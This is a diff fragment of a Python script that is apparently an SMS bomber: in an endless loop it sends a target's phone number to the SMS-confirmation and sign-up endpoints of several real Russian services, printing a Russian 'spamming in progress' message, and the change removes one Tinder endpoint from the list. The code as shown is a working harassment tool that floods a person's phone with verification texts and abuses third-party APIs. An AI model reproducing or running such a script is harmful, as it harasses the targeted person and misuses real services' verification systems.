@@ -40,7 +40,6 @@ while True:
 	print('\033[FИдет процесс спама /           ')
 	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 	print('\033[FИдет процесс спама ——          ')
-	requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 	print('\033[FИдет процесс спама \           ')
 	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
